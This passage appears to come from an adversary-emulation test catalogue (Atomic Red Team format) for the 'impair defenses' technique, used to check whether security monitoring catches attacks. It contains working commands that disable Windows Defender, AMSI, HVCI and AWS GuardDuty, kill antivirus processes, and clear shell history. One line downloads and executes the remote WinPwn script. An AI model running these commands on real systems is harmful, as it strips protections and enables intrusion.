				"prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n"
			}
		],
		"executor": {
			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n",
			"cleanup_command": "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Defender with DISM",
		"auto_generated_guid": "871438ac-7d6e-432a-b27d-3e7db69faf58",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Defender Using NirSoft AdvancedRun",
		"auto_generated_guid": "81ce22fd-9612-4154-918e-8a1f285d214d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"AdvancedRun_Location": {
				"description": "Path of Advanced Run executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
			},
			"delete_defender_folder": {
				"description": "Set to 1 to also delete the Windows Defender folder",
				"type": "integer",
				"default": 0
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
				"prereq_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n"
			}
		],
		"executor": {
			"command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
			"cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Kill antimalware protected processes using Backstab",
		"auto_generated_guid": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_name": {
				"description": "Name of the protected process you want to kill/terminate.",
				"type": "string",
				"default": "MsMpEng.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n"
			}
		],
		"executor": {
			"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WinPwn - Kill the event log services for stealth",
		"auto_generated_guid": "7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender ATP using Aliases - PowerShell",
		"auto_generated_guid": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n",
			"cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
		"auto_generated_guid": "d6d22332-d07d-498f-aea0-6139ecb7850e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
		"auto_generated_guid": "9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
		"auto_generated_guid": "d8c57eaa-497a-4a08-961e-bd5efd7c9374",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
		"auto_generated_guid": "5e27f36d-5132-4537-b43b-413b0d5eec9a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
		"auto_generated_guid": "f542ffd3-37b4-4528-837f-682874faa012",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMIC Tamper with Windows Defender Evade Scanning Folder",
		"auto_generated_guid": "59d386fc-3a4b-41b8-850d-9e3eee24dfe4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n",
			"cleanup_command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete Windows Defender Scheduled Tasks",
		"auto_generated_guid": "4b841aa1-0d05-4b32-bbe7-7564346e7c76",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "The Windows Defender scheduled tasks must be backed up first\n",
				"prereq_command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n"
			}
		],
		"executor": {
			"command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n",
			"cleanup_command": "schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear History",
		"auto_generated_guid": "23b88394-091b-4968-a42d-fb8076992443",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "history -c\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Suspend History",
		"auto_generated_guid": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "set +o history\n",
			"cleanup_command": "set -o history\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Reboot Linux Host via Kernel System Request",
		"auto_generated_guid": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Pagging Cache",
		"auto_generated_guid": "f790927b-ea85-4a16-b7b2-7eb44176a510",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Memory Swap",
		"auto_generated_guid": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "swapon -a \nsleep 2\nswapoff -a\nsync\n",
			"cleanup_command": "swapon -a\nsleep 2\nsync\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Hypervisor-Enforced Code Integrity (HVCI)",
		"auto_generated_guid": "70bd71e6-eba4-4e00-92f7-617911dbe020",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "HVCI must be enabled\n",
				"prereq_command": "if (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f\n"
			}
		],
		"executor": {
			"command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AMSI Bypass - Override AMSI via COM",
		"auto_generated_guid": "17538258-5699-4ff1-92d1-5ac9b0dc21f5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n",
			"cleanup_command": "REG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - GuardDuty Suspension or Deletion",
		"auto_generated_guid": "11e65d8d-e7e4-470e-a3ff-82bc56ad938e",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"region": {
				"description": "Name of the specified region",
				"type": "string",
				"default": "us-east-1"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
			}
		],
		"executor": {
			"command": "detectorId=$(aws guardduty create-detector --enable --region \"#{region}\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n",
			"cleanup_command": "echo \"If test successfully ran, no cleanup required.\"\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Defender ATP on Linux/MacOS",
		"auto_generated_guid": "40074085-dbc8-492b-90a3-11bcfc52fda8",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "sudo mdatp config real-time-protection --value disabled\n",
			"cleanup_command": "sudo mdatp config real-time-protection --value enabled\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Registry - Reg.exe",
		"auto_generated_guid": "1f6743da-6ecc-4a93-b03f-dc357e4b313f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\n",
			"cleanup_command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Registry - Powershell",
		"auto_generated_guid": "a72cfef8-d252-48b3-b292-635d332625c3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" 